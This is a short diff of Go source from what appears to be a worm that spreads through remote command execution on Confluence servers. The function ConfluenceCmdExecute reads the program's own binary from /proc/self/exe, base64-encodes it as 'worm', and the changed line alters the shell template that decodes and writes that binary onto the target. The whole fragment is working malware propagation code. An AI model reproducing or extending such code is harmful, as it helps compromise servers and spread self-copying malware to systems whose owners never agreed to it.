@@ -47,7 +47,7 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
 		var worm []byte
 		var copyTemplate string
 
-		copyTemplate = "echo '%s' | base64 -d > %s"
+		copyTemplate = "echo %s | base64 -d | tee %s"
 
 		worm = GetFile("/proc/self/exe")
 		worm64 := base64.StdEncoding.EncodeToString(worm)
